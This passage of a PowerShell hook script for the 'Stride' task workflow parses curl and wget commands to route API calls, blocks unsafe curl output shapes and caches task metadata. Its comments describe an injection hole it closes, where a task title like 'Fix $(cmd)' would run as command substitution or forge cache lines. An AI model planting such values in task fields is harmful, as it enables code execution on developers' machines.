    $optValue = @('-H','--header','-o','--output','-u','--user','-A','--user-agent',
        '-e','--referer','-b','--cookie','-c','--cookie-jar','-w','--write-out',
        '-m','--max-time','--connect-timeout','--retry','--retry-delay','-x','--proxy',
        '-E','--cert','--key','--cacert','--capath','-K','--config','--resolve',
        '--interface','--limit-rate','--oauth2-bearer','-D','--dump-header','--trace',
        '--trace-ascii','--stderr','--netrc-file','--form-string','--cert-type',
        '--key-type','--pinnedpubkey','--proxy-user','--noproxy','--unix-socket',
        '--output-dir','--range','-r')
    # A redirection target is not a request URL. This pattern reproduces the sh
    # mirror's case list EXACTLY, including every file descriptor 0-9 — an
    # enumeration of only 0-2 left `3> /path/api/tasks/9/complete` unconsumed,
    # so the redirect target reached the URL classifier and supplied both the
    # section and the task id.
    $redirOp = '^(>|>>|>\||<|&>|&>>|&|[0-9](>|>>|<|>&))$'
    $dataOpt = @('-d','--data','--data-raw','--data-binary','--data-ascii',
        '--data-urlencode','-F','--form','-T','--upload-file')
    $prefix = @('env','sudo','command','builtin','exec','nohup','nice','stdbuf',
        'timeout','time','if','while','until')
    $sep = @(';',';;','&','&&','|','||','|&','(',')','{','}','!',
        'then','else','elif','do','done','fi')

    foreach ($rawIn in [regex]::Split((Remove-StrideHeredocBodies $CommandText), "\r?\n")) {
        # Drop a trailing CR before anything else, exactly as the sh mirror does,
        # so a CRLF command's URL token is not left with a \r that no tail matches.
        $raw = if ($rawIn.EndsWith("`r")) { $rawIn.Substring(0, $rawIn.Length - 1) } else { $rawIn }
        # Join backslash continuations FIRST: the documented completion curl
        # spans five physical lines and its URL is not always on the curl line.
        if ($raw.EndsWith('\')) { $pend += $raw.Substring(0, $raw.Length - 1) + ' '; continue }
        $line = $pend + $raw
        $pend = ''

        if ($script:StrideQuoteState -cne '') {
            # Inside a multi-line quoted payload: no command position exists here.
            Update-StrideQuoteState -Text $line -StopWhenClosed
            if ($script:StrideQuoteState -cne '') { continue }
            $line = $script:StrideQuoteRest
        } else {
            $hit = Test-StrideSegment $seg
            if ($hit) { break }
            $seg = New-StrideSegment
        }

        # Once a variable holding an API URL has been recorded, a later line can
        # name it without mentioning the path, so the fast path must not skip it.
        # A line carrying an assignment must be tokenised even when it names no
        # API path, or the FIRST of two assignments is hidden and the second
        # looks like a first — no sentinel, and a branch-dependent URL resolves.
        if ($line -cnotlike '*/api/tasks/*' -and $vars.Count -eq 0 -and
            $line -cnotmatch '(^|\s)[A-Za-z_][A-Za-z0-9_]*=') {
            Update-StrideQuoteState -Text $line; continue
        }

        foreach ($t in ($line -split '\s+')) {
            if ($t -ceq '') { continue }
            $tok = $t
            $qb = $script:StrideQuoteState
            Update-StrideQuoteState -Text $tok
            # A token that BEGAN inside a quoted string is payload text, never syntax.
            if ($qb -cne '') { continue }

            # Mirror the sh `case` ordering exactly: $( wins over a backtick.
            if ($tok.Contains('$(')) {
                $tok = $tok.Substring($tok.LastIndexOf('$(') + 2)
                $hit = Test-StrideSegment $seg
                if ($hit) { break }
                $seg = New-StrideSegment
                if ($tok -ceq '') { continue }
            } elseif ($tok.Contains('`')) {
                $tok = $tok.Substring($tok.LastIndexOf('`') + 1)
                $hit = Test-StrideSegment $seg
                if ($hit) { break }
                $seg = New-StrideSegment
                if ($tok -ceq '') { continue }
            }
            if ($sep -ccontains $tok) {
                $hit = Test-StrideSegment $seg
                if ($hit) { break }
                $seg = New-StrideSegment
                continue
            }
            if ($tok.Contains(';')) {
                # `URL=...;` puts the assignment and the separator in one token.
                $pre = $tok.Substring(0, $tok.IndexOf(';'))
                if ($pre -cmatch '^[A-Za-z_][A-Za-z0-9_]*=') { Add-StrideVar $vars $pre }
                $hit = Test-StrideSegment $seg
                if ($hit) { break }
                $seg = New-StrideSegment
                $tok = $tok.Substring($tok.LastIndexOf(';') + 1)
                if ($tok -ceq '') { continue }
            }

            if ($seg.Pos) {
                # `(curl ...)` in a subshell — the paren opens a command position.
                # NOT `{`: it is a reserved word requiring a following space, so
                # it already arrives as its own separator token.
                while ($tok.StartsWith('(')) { $tok = $tok.Substring(1) }
                if ($tok -ceq '') { continue }
                if ($tok -clike '-*') { continue }
                if ($tok -cmatch '^[0-9][0-9smhd.]*$') { continue }
                if ($tok -cmatch '^[A-Za-z_][A-Za-z0-9_]*=') { Add-StrideVar $vars $tok; continue }
                # sh splits the basename on '/' only and matches curl/wget/.exe
                # literally — mirror that rather than also splitting on '\'.
                $base = $tok.Substring($tok.LastIndexOf('/') + 1)
                if ($prefix -ccontains $base) { continue }
                if ($base -ceq 'curl' -or $base -ceq 'curl.exe' -or
                    $base -ceq 'wget' -or $base -ceq 'wget.exe') {
                    $seg.Client = $base -creplace '\.exe$', ''
                    $seg.Pos = $false; continue
                }
                # Another program owns this segment.
                $seg.Pos = $false; $seg.Client = ''; continue
            }
            if ($seg.Client -ceq '') { continue }

            if ($seg.Next -cne '') {
                if ($seg.Next -ceq 'method') { $seg.Method = $tok }
                elseif ($seg.Next -ceq 'url') { Set-StrideSegmentUrl $seg $tok $vars }
                $seg.Next = ''
                continue
            }

            if ($tok -ceq '-X' -or $tok -ceq '--request') { $seg.Next = 'method'; continue }
            if ($tok -ceq '--url')                        { $seg.Next = 'url'; continue }
            if ($tok -ceq '-G' -or $tok -ceq '--get')     { $seg.Method = 'GET'; continue }
            if ($tok -clike '--method=*')  { $seg.Method = $tok.Substring(9);  continue }
            if ($tok -clike '--request=*') { $seg.Method = $tok.Substring(10); continue }
            if ($tok -clike '--url=*')     { Set-StrideSegmentUrl $seg $tok.Substring(6) $vars; continue }
            if ($tok -clike '-X*')         { $seg.Method = $tok.Substring(2);  continue }
            if ($dataOpt -ccontains $tok) {
                if ($seg.Implied -ceq '') { $seg.Implied = 'POST' }
                $seg.Next = 'value'; continue
            }
            if ($tok -clike '--data=*'     -or $tok -clike '--data-raw=*' -or
                $tok -clike '--data-binary=*' -or $tok -clike '--data-ascii=*' -or
                $tok -clike '--data-urlencode=*' -or
                $tok -clike '--post-data*' -or $tok -clike '--post-file*' -or
                $tok -clike '--body-data*' -or $tok -clike '--body-file*' -or
                $tok -clike '-d*') {
                if ($seg.Implied -ceq '') { $seg.Implied = 'POST' }
                continue
            }
            if ($optValue -ccontains $tok) { $seg.Next = 'value'; continue }
            if ($tok -cmatch '^-[^-].*X$') { $seg.Next = 'method'; continue }
            if ($tok -clike '-*')          { continue }
            if ($tok -cmatch $redirOp)     { $seg.Next = 'value'; continue }
            if ($tok.Contains('>') -or $tok.Contains('<')) { continue }  # attached, e.g. >/tmp/f
            Set-StrideSegmentUrl $seg $tok $vars
        }
        if ($hit) { break }
    }
    if (-not $hit) { $hit = Test-StrideSegment $seg }
    if (-not $hit) { return $route }

    $route.Endpoint = $hit.Endpoint
    $route.TaskId   = $hit.TaskId
    # Case-sensitive throughout, matching the sh mirror's `case` semantics.
    if ($Phase -ceq 'post') {
        if     ($hit.Endpoint -ceq 'claim')         { $route.HookName = 'before_doing' }
        elseif ($hit.Endpoint -ceq 'mark_reviewed') { $route.HookName = 'after_review' }
        elseif ($hit.Endpoint -ceq 'complete')      { $route.HookName = 'before_review' }
    } elseif ($Phase -ceq 'pre' -and $hit.Endpoint -ceq 'complete') {
        $route.HookName = 'after_doing'
    }
    return $route
}

# Exit early if no phase argument
if (-not $Phase) { exit 0 }

if (-not (Test-Path $StrideMd)) { exit 0 }

# Read Claude Code hook input from stdin.
#
# W2131 note on ordering: the unsafe-curl guard below sits AFTER this
# .stride.md gate. An earlier revision hoisted the read above it so the guard
# would fire in projects with no .stride.md, on the reasoning that such a
# project "still loses its diff silently". That reasoning was wrong -- every
# capture path sits below this gate, so such a project captures nothing and has
# no diff to lose -- and the hoist widened the guard's blast radius to every
# project on the machine. Mirrors the same revert in stride-hook.sh.
$Input = @($input) -join "`n"
if (-not $Input) { exit 0 }

# --- Extract the Bash command from hook JSON ---
$Command = ''
try {
    $json = $Input | ConvertFrom-Json
    $Command = $json.tool_input.command
} catch {
    # Fallback: simple string extraction for "command" : "value"
    if ($Input -match '"command"\s*:\s*"([^"]*)"') {
        $Command = $Matches[1]
    }
}

if (-not $Command) { exit 0 }

# --- W2131: refuse unsafe Stride API curl shapes (PreToolUse) --------------
#
# Mirror of the guard in stride-hook.sh. The three curl invocation rules are
# stated in stride-claiming-tasks, stride-workflow and stride-completing-tasks.
# They were still broken under load, and the failure is SILENT: the hook reads
# the API response off stdout to capture the diff and refresh the env cache, so
# hiding stdout means the diff is never captured and the task shows an empty
# changed_files with no error at all.
#
# The command text carries a Bearer token. Nothing below inspects, stores or
# emits any part of it -- matching is on URL and flag/pipe shape only, and the
# refusal message is a static string that never interpolates the command.

# tee is deliberately absent: it is the one blessed pipe, because it passes
# stdout through unchanged.
$StrideGuardTransformers = @('jq', 'head', 'awk', 'grep', 'sed')

# Resolve the effective command word of a pipeline stage: step over an
# env/command wrapper and any VAR=VALUE assignments, then basename it, so
# `env FOO=1 /usr/bin/jq` and `jq` resolve alike. Mirrors
# stride_guard_cmd_word in stride-hook.sh.
function Get-StrideGuardCmdWord {
    param([string]$Segment)
    $words = @($Segment.Trim() -split '\s+' | Where-Object { $_ -ne '' })
    $i = 0
    while ($i -lt $words.Count) {
        $w = $words[$i]
        if ($w -ceq 'env' -or $w -ceq 'command') { $i++; continue }
        if ($w -cmatch '^[^=\s]+=') { $i++; continue }
        break
    }
    if ($i -ge $words.Count) { return '' }
    return ($words[$i] -replace '^.*/', '')
}

function Get-StrideUnsafeCurlKind {
    param([string]$Cmd)

    # --- Cheap prefilter on the RAW text ---
    # Both literals must appear before any work is done. This is a prefilter
    # ONLY -- deliberately on the raw text, because a legitimate
    # `curl -sS "$U/api/tasks/next"` carries the endpoint inside quotes and
    # would be filtered out if this ran on the quote-blanked text. It decides
    # nothing; the curl-in-command-position confirmation below decides.
    #
    # -cnotlike, not -notlike: PowerShell's -like family is case-INSENSITIVE by
    # default, which would put `CURL` and `/API/TASKS/` in scope here while the
    # bash half's `case` left them out. Every other Stride-URL test in this file
    # already uses -cnotlike for exactly that reason.
    if ($Cmd -cnotlike '*/api/tasks/*') { return '' }
    if ($Cmd -cnotlike '*curl*')        { return '' }

    # Heredoc bodies are payload, not command shape. Bounded for the same reason
    # as the bash half -- the quote walk is superlinear and a PreToolUse hook
    # killed on a timeout fails OPEN -- and with the same measured ceiling of
    # 4,000 rather than the 20,000 an earlier revision used, which did not bound
    # the work at all. Past the ceiling BOTH the strip and the quote blanking
    # are skipped: skipping only the strip was not monotone, because the
    # blanking scanner carries quote state that an apostrophe in an unstripped
    # heredoc body can flip, blanking a real -o on a later line.
    $oversize = ($Cmd.Length -gt 4000)
    if ($oversize) {
        $scan = $Cmd
    } else {
        $scan = Remove-StrideHeredocBodies $Cmd
    }

    # Judge SHAPE only outside quotes. Quoted spans are BLANKED rather than
    # deleted so adjacency is preserved and a flag cannot be manufactured by
    # splicing two sides of a removed string together. Backslash escapes are
    # modelled. Newlines/tabs flattened first so a multi-line command is one line.
    # Join backslash-newline CONTINUATIONS first: a continued command is one
    # command, and splitting it at its line breaks would shatter it into
    # fragments and lose the flag that follows.
    $joined = $scan -replace '\\\r?\n[ \t]*', ' '
    # Tabs become spaces, but NEWLINES ARE KEPT: a newline is a command
    # separator in shell exactly as `;` is. Flattening it away was a real defect
    # in both directions -- it merged a curl with an unrelated neighbour, and it
    # hid a curl behind one so an unsafe curl on line two was never judged.
    $joined = $joined -replace "`t", ' '

    # Blank quoted spans PER LINE, so quote state resets at each newline -- the
    # correct reading once continuations are already joined above.
    $blankLine = {
        param([string]$Line)
        $b = [System.Text.StringBuilder]::new()
        $q = ''
        $i = 0
        while ($i -lt $Line.Length) {
            $c = $Line[$i]
            if ($q -eq '') {
                if ($c -eq '\') { [void]$b.Append(' '); $i += 2; continue }
                if ($c -eq "'") { $q = 's'; [void]$b.Append(' '); $i++; continue }
                if ($c -eq '"') { $q = 'd'; [void]$b.Append(' '); $i++; continue }
                [void]$b.Append($c); $i++
            } elseif ($q -eq 's') {
                if ($c -eq "'") { $q = '' }
                [void]$b.Append(' '); $i++
            } else {
                if ($c -eq '\') { [void]$b.Append(' '); $i += 2; continue }
                if ($c -eq '"') { $q = '' }
                [void]$b.Append(' '); $i++
            }
        }
        return $b.ToString()
    }

    if ($oversize) {
        # Stateless above the ceiling -- see the note above.
        $flat = $joined
    } else {
        $flat = (($joined -split '\r?\n') | ForEach-Object { & $blankLine $_ }) -join "`n"
    }

    # --- Split into COMMAND SEGMENTS ---
    # `;`, `&&` and `||` end one command and begin another. Judging the whole
    # string instead is how a flag belonging to an unrelated neighbour gets
    # attributed to the curl: `curl ... | tee r.json && gcc -o app` carries a -o
    # that is not curl's, and refusing it names a flag the agent's curl does not
    # have. A pipeline stays INSIDE its segment, because `| tee` and `| jq`
    # genuinely are part of the curl's own command.
    $segments = [regex]::Split($flat, '&&|\|\||;|\r?\n')

    foreach ($seg in $segments) {
        # Is curl the actual COMMAND of some stage of this segment? A mere
        # mention is not enough -- that is what let `grep -o "curl.*/api/tasks/"`
        # be refused as a Stride curl.
        $isCurl = $false
        foreach ($stage in ($seg -split '\|')) {
            if ((Get-StrideGuardCmdWord $stage) -ceq 'curl') { $isCurl = $true }
        }
        if (-not $isCurl) { continue }

        # --- Rule 1: never -o / --output / -O ---
        # Token-wise, because curl CLUSTERS short options and ATTACHES values:
        # `-o out.json`, `-oout.json` and `-sSo out.json` are all the output
        # flag. `-O`/`--remote-name` is included deliberately: it likewise takes
        # the body off stdout. Judging only a curl segment is what makes that
        # safe -- `gcc -O2` and `rustc -O` are different commands, never reached.
        foreach ($tok in ($seg -split '\s+')) {
            if ($tok -eq '') { continue }
            if ($tok -ceq '--output' -or $tok -clike '--output=*' -or
                $tok -clike '--output/*') {
                return 'flag'
            }
            if ($tok -ceq '--remote-name') { return 'remote' }
            if ($tok -clike '--*') { continue }
            if ($tok -clike '-*') {
                if ($tok -cmatch '^-([A-Za-z]+)') {
                    if ($Matches[1] -cmatch 'o') { return 'flag' }
                    if ($Matches[1] -cmatch 'O') { return 'remote' }
                }
            }
        }

        # --- Rule 2: never pipe into a transformer ---
        $stages = @($seg -split '\|')
        for ($s = 1; $s -lt $stages.Count; $s++) {
            $word = Get-StrideGuardCmdWord $stages[$s]
            # -ccontains, not -contains: the bash half compares with [ = ],
            # which is case-sensitive, so `| JQ` must not match here either.
            if ($StrideGuardTransformers -ccontains $word) { return 'pipe' }
        }
    }

    return ''
}

if ($Phase -eq 'pre') {
    $guardKind = Get-StrideUnsafeCurlKind $Command
    if ($guardKind) {
        if ($guardKind -eq 'remote') {
            $guardMsg = 'Refused: this Stride API curl uses -O/--remote-name, which writes the body to a file instead of stdout. The Stride hook reads that response to capture your file diff and refresh the env cache, so the diff is dropped silently and the task completes with an empty changed_files and no error. The rule is stated for -o/--output, and -O is refused for the same reason rather than as a separate rule: it takes the body off stdout. Use: curl ... | tee "$CLAUDE_PROJECT_DIR/.stride/.last-api-response.json"'
        } elseif ($guardKind -eq 'flag') {
            $guardMsg = 'Refused: this Stride API curl uses -o/--output, which removes the response from stdout. The Stride hook reads that response to capture your file diff and refresh the env cache, so hiding it drops the diff silently and the task completes with an empty changed_files and no error. Rule: never -o/--output, never pipe into a transformer (jq, head, awk, grep, sed), always pipe into tee. Use: curl ... | tee "$CLAUDE_PROJECT_DIR/.stride/.last-api-response.json"'
        } else {
            $guardMsg = 'Refused: this Stride API curl pipes into a transformer (jq, head, awk, grep or sed), which alters or truncates what the Stride hook reads from stdout. The hook needs the response verbatim to capture your file diff and refresh the env cache, so the diff is dropped silently and the task completes with an empty changed_files and no error. tee is the one blessed pipe, because it passes stdout through unchanged. Use: curl ... | tee "$CLAUDE_PROJECT_DIR/.stride/.last-api-response.json"'
        }
        $payload = [ordered]@{ decision = 'block'; reason = $guardMsg }
        Write-Output ($payload | ConvertTo-Json -Compress)
        [Console]::Error.WriteLine("stride-hook: $guardMsg")
        exit 2
    }
}

# --- Determine which Stride hook to run (D220) ---
# Routing:
#   post + /api/tasks/claim        → before_doing
#   pre  + /api/tasks/:id/complete → after_doing  (blocks completion if it fails)
#   post + /api/tasks/:id/complete → before_review
#   post + /api/tasks/:id/mark_reviewed → after_review
#
# Get-StrideRoute is the ONLY place the command text is inspected for routing: it
# requires the call to actually ISSUE the request rather than merely mention it.
# The after-goal gate below reads $StrideRoute.Endpoint so the two cannot drift.

$StrideRoute = Get-StrideRoute -Phase $Phase -CommandText $Command
$HookName = $StrideRoute.HookName

# Not a Stride API call — exit cleanly
if (-not $HookName) { exit 0 }

# (W1609) Persist THIS call's response to the canonical file before the claim
# env-cache refresh reads it, so a valid current stdout overwrites any stale
# prior-call file (no staleness regression) and a truncated stdout leaves an
# out-of-band copy intact.
if ($Phase -eq 'post') {
    Save-CanonicalResponse -InputJson $Input
}

# --- Environment variable caching ---
# After a successful claim (before_doing), extract task metadata from the API
# response and cache it. All subsequent hooks load the cache so .stride.md
# commands can reference $TASK_IDENTIFIER, $TASK_TITLE, etc.

if ($HookName -eq 'before_doing') {
    try {
        $taskJson = $null

        # (D118/W1609) Fast path — prefer the untruncated canonical response
        # file. Falls through to the tool_response parse below when it is absent
        # or does not carry a task object.
        $canon = Read-CanonicalResponse
        if ($null -ne $canon) {
            $canonProps = $canon.PSObject.Properties.Name
            if (($canonProps -contains 'data') -and $canon.data -and
                ($canon.data.PSObject.Properties.Name -contains 'id') -and $canon.data.id) {
                $taskJson = $canon.data
            } elseif (($canonProps -contains 'id') -and $canon.id) {
                $taskJson = $canon
            }
        }

        $json = $Input | ConvertFrom-Json
        $response = $json.tool_response
        if (-not $taskJson -and $response) {

            # Shape 1: Claude Code Bash tool wraps API JSON inside tool_response.stdout
            # — peel that layer first before parsing.
            if ($response -is [PSCustomObject] -and $response.PSObject.Properties.Name -contains 'stdout') {
                try {
                    $innerObj = $response.stdout | ConvertFrom-Json
                    if ($innerObj.data -and $innerObj.data.id) {
                        $taskJson = $innerObj.data
                    } elseif ($innerObj.id) {
                        $taskJson = $innerObj
                    }
                } catch {
                    # stdout was not parseable JSON — fall through to other shapes
                }
            }

            # Shape 2: tool_response is a JSON-encoded string (legacy harnesses)
            if (-not $taskJson -and $response -is [string]) {
                try {
                    $responseObj = $response | ConvertFrom-Json
                    if ($responseObj.data -and $responseObj.data.id) {
                        $taskJson = $responseObj.data
                    } elseif ($responseObj.id) {
                        $taskJson = $responseObj
                    }
                } catch {
                    # not parseable — skip caching
                }
            }

            # Shape 3: raw API JSON object directly in tool_response.
            # Guard property access by name first — under Set-StrictMode Latest,
            # reading a non-existent property (e.g. .data on the stdout-wrapper
            # object) throws, which would otherwise abort the whole caching block
            # before the persisted-output fallback and base-ref refresh run.
            if (-not $taskJson -and $response -is [PSCustomObject]) {
                $responseProps = $response.PSObject.Properties.Name
                if (($responseProps -contains 'data') -and $response.data -and $response.data.id) {
                    $taskJson = $response.data
                } elseif (($responseProps -contains 'id') -and $response.id) {
                    $taskJson = $response
                }
            }

            # Shape 4: persisted-output file fallback (W1087, mirrors the bash
            # Shape 3). When the claim response is large, Claude Code writes the
            # tool output to a file and leaves only a "Full output saved to:
            # <absolute path>" notice in stdout. Recover the API JSON by reading
            # that file. The path is harness-controlled, so require an existing
            # regular file and parse it with ConvertFrom-Json only — never
            # invoke, dot-source, or write to it.
            if (-not $taskJson) {
                $notice = $null
                if ($response -is [PSCustomObject] -and $response.PSObject.Properties.Name -contains 'stdout') {
                    $notice = $response.stdout
                } elseif ($response -is [string]) {
                    $notice = $response
                }
                if ($notice -and ($notice -imatch 'saved to')) {
                    # Keep the path from its first "/" to end of the notice line so
                    # a path containing spaces survives; tolerate a wrapping quote.
                    $noticeLine = ($notice -split "`n" | Where-Object { $_ -imatch 'saved to' } | Select-Object -First 1)
                    if ($noticeLine) {
                        $persistPath = '/' + ($noticeLine -replace '^[^/]*/', '')
                        $persistPath = ($persistPath.TrimEnd()) -replace '"$', ''
                        if (Test-Path -LiteralPath $persistPath -PathType Leaf) {
                            try {
                                $persistObj = (Get-Content -LiteralPath $persistPath -Raw -ErrorAction SilentlyContinue) | ConvertFrom-Json
                                # Guard property access by name (StrictMode) so an
                                # id-only persisted payload caches identity lines
                                # exactly as the bash reference does, rather than
                                # throwing and falling through to the base-ref-only
                                # refresh.
                                $persistProps = $persistObj.PSObject.Properties.Name
                                if (($persistProps -contains 'data') -and $persistObj.data -and $persistObj.data.id) {
                                    $taskJson = $persistObj.data
                                } elseif (($persistProps -contains 'id') -and $persistObj.id) {
                                    $taskJson = $persistObj
                                }
                            } catch {
                                # persisted file not parseable JSON — fall through
                            }
                        }
                    }
                }
            }
        }

        # (D142) This block refreshes IDENTITY only. TASK_BASE_REF is
        # deliberately NOT written here: the ## before_doing section has not
        # run yet, and its `git pull` moves HEAD — a base captured now would
        # anchor the diff at the PRE-pull commit and span another clone's
        # pulled work (D132/W1678). Invoke-FinalizeBeforeDoing writes the base
        # (and the dirty baseline) after the section finishes.
        # (D226) Ownership may be stamped ONLY when THIS call's own response
        # carried the SAME id that was resolved. Read-CanonicalResponse
        # survives across calls, so a truncated nested claim otherwise
        # resolves the PREVIOUS claim's payload, reports the outer task's id,
        # overwrites that task's record with this claim's HEAD and then
        # vouches for it — the owner then MATCHES at completion, the refusal
        # never fires, and the outer task carries a foreign base. Measured on
        # the bash twin; this is the same gate, because the same resolver
        # shape produces the same defect here.
        $ownCallId = ''
        if ($response) {
            $ownObj = $null
            try {
                if ($response -is [PSCustomObject] -and $response.PSObject.Properties.Name -contains 'stdout') {
                    $ownObj = $response.stdout | ConvertFrom-Json
                } elseif ($response -is [string]) {
                    $ownObj = $response | ConvertFrom-Json
                } elseif ($response -is [PSCustomObject]) {
                    $ownObj = $response
                }
            } catch {
                $ownObj = $null
            }
            if ($ownObj) {
                $ownProps = $ownObj.PSObject.Properties.Name
                if (($ownProps -contains 'data') -and $ownObj.data -and
                    ($ownObj.data.PSObject.Properties.Name -contains 'id') -and $ownObj.data.id) {
                    $ownCallId = [string]$ownObj.data.id
                } elseif (($ownProps -contains 'id') -and $ownObj.id) {
                    $ownCallId = [string]$ownObj.id
                }
            }
        }
        if ($taskJson -and $ownCallId -and ($ownCallId -eq [string]$taskJson.id)) {
            $script:TaskIdentityRefreshed = $true
            # Carry the VALIDATED id forward, never re-read $env:TASK_ID
            # later: that comes from the cache, loaded AFTER the identity
            # write, so the two agree only when that write landed.
            $script:TaskOwnerId = $ownCallId
        }
        # Equivalence with the bash gate, mapped branch by branch so a future
        # edit cannot break it silently:
        #   object with `stdout`   -> $response.stdout | ConvertFrom-Json   ==  jq has("stdout") -> .stdout
        #   string                 -> ConvertFrom-Json                      ==  jq -r raw string
        #   object without `stdout`-> the object directly                   ==  jq -r emits its JSON text, re-parsed
        # Arrays, scalars, and unparseable stdout deliberately fall through
        # to "not refreshed" — both implementations fail CLOSED there. One
        # known mechanism difference: jq accepts a concatenated value stream
        # where ConvertFrom-Json throws, so bash may gate true where this
        # gates false; bash's multi-line stamp then cannot match the
        # URL-derived task id, so it refuses. Different routes, both safe.

        if ($taskJson) {
            # (D226) This rewrite TRUNCATES the cache, so carry the per-task
            # base-ref records across it — a nested claim must not erase an
            # outer task's anchor. The shared TASK_BASE_REF / _TRUSTED /
            # _OWNER keys are still dropped here, exactly as D142 requires.
            # (D280 r2) Get-EnvCacheLine, not Get-Content. This is a
            # PASS-THROUGH re-emit: it copies lines already on disk into a
            # rewrite. .NET's line reader honours a lone CR, so a CR-bearing
            # value authored by the UNCHANGED bash twin — which sq_escapes but
            # does not flatten — arrives here as one physical line and leaves as
            # several, and Write-EnvCache then re-joins them with LF, PROMOTING
            # an attacker's fragment into a genuine cache line that bash sources.
            # Flattening our own writes does not help: this path never authored
            # the value. Every reader of this file must agree on what a line is.
            # (D289) Under the compare-and-swap, and this is the direction the
            # defect is named for: the read below and the write at the end of
            # this branch used to be separated by the whole identity build, so a
            # record write committed inside that window was discarded wholesale
            # by the rename. Re-reading on retry is what makes it a fix - the
            # second attempt re-runs the selector against the concurrent
            # writer's cache, so its records are carried rather than replaced.
            Invoke-EnvCacheRewrite -What 'the claim identity block' -Build {
            param($before)
            $keptBaseRecords = @()
            if ($null -ne $before) {
                try {
                # (W2103/D268+D274) Per-window eviction, replacing the
                # tail-20 cap. No reserved key here: this branch appends no
                # base record of its own, so it reserves no slot - which is
                # what the bash twin does at the same point.
                #
                # The old filter here also OMITTED TASK_BASE_REF_UNPROVEN,
                # where bash and the other cap site both exclude it. Low impact
                # (it is stripped moments later) but a real divergence; the
                # selector excludes it by construction, so both sites are fixed
                # at once rather than one being patched and the other not.
                $keptBaseRecords = @(Select-KeptWindowRecord)
                } catch { $keptBaseRecords = @() }
            }
            # (D280) THE HEADLINE HOLE. Every one of these six values comes
            # straight off the API response and used to be written bare, into a
            # file bash SOURCES under `set -a` — so a title of `Fix $(cmd)` was
            # a command substitution bash executed, confirmed by a security
            # review. They now go through the same escaper as the record layer,
            # matching what the bash twin already does with sq_escape.
            #
            # FLATTENED AS WELL AS QUOTED, and the two close different halves.
            # Quoting alone makes the value inert to BASH — a quoted value may
            # legally span physical lines and `source` reassembles it. It does
            # NOT protect this port's own bulk loader, which is line-oriented:
            # a title carrying a newline still lands a second physical line, and
            # a crafted one shaped like TASK_BASE_REF_42='<sha>' is then read by
            # the loader as a record and consumed as another task's snapshot
            # base. Set-HookEnv has flattened for exactly this reason since
            # W1453; this block never did, which is the gap D280 closes here.
            # A deliberate divergence from the bash twin, which does not flatten
            # because `source` makes it unnecessary on that side.
            # ConvertTo-FlatEnvValue, NOT an inline `r?`n replace: that form
            # requires an LF and let a lone CR through, which Get-Content then
            # honoured as a line terminator and the loader exported as a forged
            # record. See the helper for the reproduced BASH_ENV route.
            # (D281) The projection rides on $flat so every line built below gets
            # it — this is one of the four IN boundaries. Without it a title of
            # 'café' reaches the cache as the single byte E9 where bash writes
            # C3 A9, which is the one way the Latin-1 storage projection can be
            # got wrong. See THE STORAGE PROJECTION above ConvertTo-FlatEnvValue.
            $flat = { param($v) (ConvertTo-CacheByteString -Value (ConvertTo-FlatEnvValue -Value ([string]$v))) }
            $cacheLines = @(
                "TASK_ID=" + (ConvertTo-ShSingleQuoted -Value (& $flat $taskJson.id))
                "TASK_IDENTIFIER=" + (ConvertTo-ShSingleQuoted -Value (& $flat $taskJson.identifier))
                "TASK_TITLE=" + (ConvertTo-ShSingleQuoted -Value (& $flat $taskJson.title))
                "TASK_STATUS=" + (ConvertTo-ShSingleQuoted -Value (& $flat $taskJson.status))
                "TASK_COMPLEXITY=" + (ConvertTo-ShSingleQuoted -Value (& $flat $taskJson.complexity))
                "TASK_PRIORITY=" + (ConvertTo-ShSingleQuoted -Value (& $flat $taskJson.priority))
            ) + $keptBaseRecords +
                (Get-CarriedWindowRecordLine -BaseRecordLine $keptBaseRecords -ExcludeTaskId ([string]$taskJson.id))
            # $keptBaseRecords are raw lines already on disk, carried across the
            # truncation verbatim — never re-escaped, or each claim would add
            # another layer of quoting to a record it merely preserves.
            # (W2102) Their PARTNER records are re-emitted alongside them, so
            # the attribution engine's head/owned/base_at/narrowed records
            # survive a nested claim instead of dying at the next one.
            # -ExcludeTaskId drops THIS claim's own stale verdict, as bash does.
            return @($cacheLines)
            } | Out-Null
        } elseif (Test-Path $EnvCache) {
            # (W1086/D142) No parseable response and no usable persisted
            # file: keep the existing TASK_ identity lines (a later
            # completion can still recover TASK_ID) but STRIP the inherited
            # TASK_BASE_REF (and its trust marker) NOW — even if this process
            # dies before Invoke-FinalizeBeforeDoing rewrites it, a base from
            # a previous task or session must never survive a claim.
            # (D289) That last sentence now has ONE named exception: three
            # consecutive swap collisions make the rewrite refuse, so neither
            # the strip nor the delete happens and the inherited base stays.
            # Named rather than left as a silent hole - and it stays fail-closed
            # downstream, because the surviving OWNER names another task, so
            # Resolve-TaskSnapshotBase refuses and this claim uploads an empty
            # snapshot rather than another task's diff.
            # (D226) TASK_BASE_REF_OWNER goes with the base it stamps; the
            # per-task TASK_BASE_REF_<id> records are kept, since they belong
            # to tasks other than this claim.
            #
            # (D259) An ALLOW-list, matching the bash twin. This was a
            # three-key deny-list, so GOAL_*, BOARD_*, COLUMN_* and AGENT_NAME
            # crossed the window boundary and a fresh task window opened with
            # the previous goal's identity exported to every hook in it. It
            # also missed TASK_BASE_REF_UNPROVEN, which the bash side had
            # stripped since D226 — a divergence the deny-list shape hid and
            # the allow-list removes by construction.
            #
            # Stated accurately: nothing refills those keys on THIS branch —
            # it runs because the response did not parse, so the env-forwarding
            # path yields nothing and AGENT_NAME/BOARD_*/COLUMN_* are simply
            # ABSENT for the whole flaky window. They return on the next
            # successful response, since all five hooks carry them. Absent is
            # the point rather than a cost: a section should see nothing rather
            # than the PREVIOUS window's board. GOAL_* is stronger still — it
            # is supplied only on after_goal and never at claim time, so a
            # survivor could not be corrected by any later response in this
            # window.
            #
            # A plain line filter is correct here, unlike in the bash twin,
            # because Set-HookEnv flattens newlines to spaces before writing —
            # so a cache line on this side is always a whole record. Do not
            # copy this simpler shape back into stride-hook.sh.
            #
            # NOTE this port's parseable branch above keeps only
            # TASK_BASE_REF_<id>, so it drops FOUR of the five record families
            # this branch preserves: TASK_HEAD_REF_<id> (D236, fenced by D258),
            # TASK_OWNED_<id> (D255), and TASK_BASE_AT_<id>/TASK_NARROWED_<id>
            # (D273). The two branches here therefore still disagree, in the
            # opposite direction to the defect D259 fixes. (W2101) Those
            # families now have readers AND writers on this port, but no
            # orchestration calls them, so nothing writes a record this branch
            # could drop and the gap stays latent. It stops being latent the
            # moment the D236/D255/D273 orchestration lands: the bash twin
            # carries these records across a claim by RE-EMITTING them through
            # read_task_record + sq_escape, never by copying the raw matched
